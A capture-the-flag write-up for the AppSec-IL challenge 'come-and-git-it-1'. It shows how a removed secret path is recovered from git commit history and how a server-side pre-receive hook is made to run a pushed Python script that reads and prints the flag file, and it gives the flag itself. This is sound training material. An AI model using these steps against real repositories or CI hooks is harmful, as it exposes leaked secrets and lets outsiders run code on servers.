# come-and-git-it-1
* Category: DevSecOps
* 100 Points
* Solved by the JCTF Team

## Description
> 
> 
> 1. Add the attached ssh key to your ssh-agent. [Here's some documentation](https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent#adding-your-ssh-key-to-the-ssh-agent), but TL;DR:
> 
>     ```
>     eval $(ssh-agent -s)
>     ssh-add ~/path_to_key/id_rsa.player
>     ```
> 
> 2. `git clone ssh://gamemaster@come-and-git-it.appsecil.ctf.today:2222/~/ctf-repo`
> 
> 3. `cd ctf-repo`
> 
> 4. `git checkout headmistresses-tiptoes-bezzled`
> 
> 5. ???
> 
> 6. PROFIT!!!

Attached was a private RSA key.

## Solution

Let's setup the workspace like instructed:

```console
root@kali:/media/sf_CTFs/appsec/come-and-git-it-1# eval $(ssh-agent -s)
Agent pid 9397
root@kali:/media/sf_CTFs/appsec/come-and-git-it-1# ssh-add ~/CTFs/appsec/come-and-git-it-1/id_rsa.player
Identity added: /root/CTFs/appsec/come-and-git-it-1/id_rsa.player (player@4213c9c39579)
root@kali:/media/sf_CTFs/appsec/come-and-git-it-1# git clone ssh://gamemaster@come-and-git-it.appsecil.ctf.today:2222/~/ctf-repo
Cloning into 'ctf-repo'...
remote: Enumerating objects: 49, done.
remote: Counting objects: 100% (49/49), done.
remote: Compressing objects: 100% (32/32), done.
remote: Total 49 (delta 13), reused 49 (delta 13)
Receiving objects: 100% (49/49), 13.72 KiB | 156.00 KiB/s, done.
Resolving deltas: 100% (13/13), done.
root@kali:/media/sf_CTFs/appsec/come-and-git-it-1# cd ctf-repo
root@kali:/media/sf_CTFs/appsec/come-and-git-it-1/ctf-repo# git checkout headmistresses-tiptoes-bezzled
Branch 'headmistresses-tiptoes-bezzled' set up to track remote branch 'headmistresses-tiptoes-bezzled' from 'origin'.
Switched to a new branch 'headmistresses-tiptoes-bezzled'
```

We get three files:
```
root@kali:/media/sf_CTFs/appsec/come-and-git-it-1/ctf-repo# ls
capture_ze_flag.py  LICENSE  README.md
```

The Python file is tempting, but it's always a good idea to start from the README:
```console
root@kali:/media/sf_CTFs/appsec/come-and-git-it-1/ctf-repo# cat README.md
# Welcome to make-git-better

```
_____  _    _  ___   ___________
|  _  || |  | |/ _ \ /  ___| ___ \
| | | || |  | / /_\ \\ `--.| |_/ /
| | | || |/\| |  _  | `--. \  __/
\ \_/ /\  /\  / | | |/\__/ / |
 \___/  \/  \/\_| |_/\____/\_|
```

There's a script called `capture_ze_flag.py`. What else do you need? (=｀ω´=)
```

Sounds good. The Python file:

```python
flag_file_path = "[REDACTED]"

def main():
    print("Capturing a flag! How exciting.")
    with open(flag_file_path, "r") as flagfile:
        print("Flag contents are " + flagfile.read())


if __name__ == "__main__":
    main()
```

The path is redacted, but we have a git repository. Surely we can extract the path from there:

```console
root@kali:/media/sf_CTFs/appsec/come-and-git-it-1/ctf-repo# git log
commit 9b76ee35f8656b4e91fc729649e8ee7570fe3e13 (HEAD -> headmistresses-tiptoes-bezzled, tag: headmistresses-tiptoes-bezzled-tag, origin/headmistresses-tiptoes-bezzled)
Author: Shay Nehmad <dude500@gmail.com>
Date:   Tue Oct 20 01:51:28 2020 +0300

    Added backticks to .md

commit 88a3cdcaa74b201ffc727866bec62795460bdc63
Author: Shay Nehmad <dude500@gmail.com>
Date:   Sat Oct 10 20:07:17 2020 +0300

    Renamed script, I'm sure this won't break anything ┐(´д｀)┌

commit 061f4c48ce1644a3106b52834f060d5d0f603a03
Author: Shay Nehmad <dude500@gmail.com>
Date:   Sat Oct 10 20:04:48 2020 +0300

    Added a helpful print ヾ(＾∇＾)

commit efbf4c8b9794ad744a0322ba0d315c4b3b12d434
Author: Shay Nehmad <dude500@gmail.com>
Date:   Sat Oct 10 20:02:59 2020 +0300

    Un-commit-ing secrets. Security++ ఠ_ఠ

commit 52e0f0151de0f07e9ba368aca7c7ab03ceb7423f
Author: Shay Nehmad <dude500@gmail.com>
Date:   Sat Oct 10 20:01:46 2020 +0300

    Updated the README with instructions and fixed script path.

commit 6385a9c56d5191b4de88cf9f53669c7d4dcfbb6f
Author: Shay Nehmad <dude500@gmail.com>
Date:   Wed Oct 7 16:16:54 2020 +0300

    Added script which captures the flag.

commit 2699bcbe555a65732fa0f7619455a952a5a33ea3 (origin/master, origin/HEAD, master)
Author: Shay Nehmad <shay.nehmad@guardicore.com>
Date:   Fri May 29 12:14:16 2020 +0300

    Added some content to the readme to make it look better.

commit 088af4ec974ee7fc1f4742c50bd6b68b66f9ac6d
Author: Shay Nehmad <shay.nehmad@guardicore.com>
Date:   Tue May 12 20:35:36 2020 +0300

    Added initial README file

commit e3be94525dff4481367486c5c0a5d39298d48425
Author: Shay Nehmad <shay.nehmad@guardicore.com>
Date:   Tue May 12 20:32:14 2020 +0300

    Added license file

commit 86124cccc6cf34cfcee157ca4d42f9563f3cdf63
Author: Shay Nehmad <48879847+ShayNehmad@users.noreply.github.com>
Date:   Tue May 12 20:30:54 2020 +0300

    Initial commit
```

The commit marked "Un-commit-ing secrets" seems suspicious. What happened there?

```console
root@kali:/media/sf_CTFs/appsec/come-and-git-it-1/ctf-repo# git log -p -1 efbf4c8b9794ad744a0322ba0d315c4b3b12d434
commit efbf4c8b9794ad744a0322ba0d315c4b3b12d434
Author: Shay Nehmad <dude500@gmail.com>
Date:   Sat Oct 10 20:02:59 2020 +0300

    Un-commit-ing secrets. Security++ ఠ_ఠ

diff --git a/capture_the_flag.py b/capture_the_flag.py
index 8c93632..ff817a3 100644
--- a/capture_the_flag.py
+++ b/capture_the_flag.py
@@ -1,4 +1,4 @@
-flag_file_path = "/etc/owasp/flags/flag.txt"
+flag_file_path = "[REDACTED]"

 def main():
     print("Capturing a flag! How exciting.")
```

So we have the redacted path, but now what? We don't have access to the server.

The solution revealed itself after attempting to push a change to the server:

```console
root@kali:/media/sf_CTFs/appsec/come-and-git-it-1/ctf-repo# touch dummy.txt
root@kali:/media/sf_CTFs/appsec/come-and-git-it-1/ctf-repo# git add dummy.txt
root@kali:/media/sf_CTFs/appsec/come-and-git-it-1/ctf-repo# git commit -m "Desperate move"
root@kali:/media/sf_CTFs/appsec/come-and-git-it-1/ctf-repo# git push
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 265 bytes | 16.00 KiB/s, done.
Total 3 (delta 1), reused 1 (delta 0)
remote:
remote: -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
remote:
remote: Pushed a branch: headmistresses-tiptoes-bezzled
remote: Solution rejected. Reason:
remote: capture_the_flag.py is missing.
To ssh://come-and-git-it.appsecil.ctf.today:2222/~/ctf-repo
 ! [remote rejected] headmistresses-tiptoes-bezzled -> headmistresses-tiptoes-bezzled (pre-receive hook declined)
error: failed to push some refs to 'ssh://gamemaster@come-and-git-it.appsecil.ctf.today:2222/~/ctf-repo'
```

The hook runs `capture_the_flag.py` after pushing. We have a file called `capture_ze_flag.py` with a redacted path. After renaming it and re-adding the path, we can finally attempt to push again:

```console
root@kali:/media/sf_CTFs/appsec/come-and-git-it-1/ctf-repo# cat capture_the_flag.py
flag_file_path = "/etc/owasp/flags/flag.txt"

def main():
    print("Capturing a flag! How exciting.")
    with open(flag_file_path, "r") as flagfile:
        print("Flag contents are " + flagfile.read())


if __name__ == "__main__":
    main()
root@kali:/media/sf_CTFs/appsec/come-and-git-it-1/ctf-repo# git add capture_the_flag.py
root@kali:/media/sf_CTFs/appsec/come-and-git-it-1/ctf-repo# git commit -m "Capture the flag"
[headmistresses-tiptoes-bezzled e039d6c] Capture the flag
 1 file changed, 10 insertions(+)
 create mode 100644 capture_the_flag.py
root@kali:/media/sf_CTFs/appsec/come-and-git-it-1/ctf-repo# git push
Enumerating objects: 7, done.
Counting objects: 100% (7/7), done.
Compressing objects: 100% (5/5), done.
Writing objects: 100% (6/6), 715 bytes | 29.00 KiB/s, done.
Total 6 (delta 1), reused 1 (delta 0)
remote:
remote: -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
remote:
remote: Pushed a branch: headmistresses-tiptoes-bezzled
remote: capture_the_flag.py found, attempting to execute it as flagger
remote: Capturing a flag! How exciting.
remote: Flag contents are "AppSec-IL{g1t_d035_P3rM1t_T0_c0mm1T}"
remote:
remote: I've attempted to run the script. Bye bye now.
To ssh://come-and-git-it.appsecil.ctf.today:2222/~/ctf-repo
 ! [remote rejected] headmistresses-tiptoes-bezzled -> headmistresses-tiptoes-bezzled (pre-receive hook declined)
error: failed to push some refs to 'ssh://gamemaster@come-and-git-it.appsecil.ctf.today:2222/~/ctf-repo'
```

The flag: `AppSec-IL{g1t_d035_P3rM1t_T0_c0mm1T}`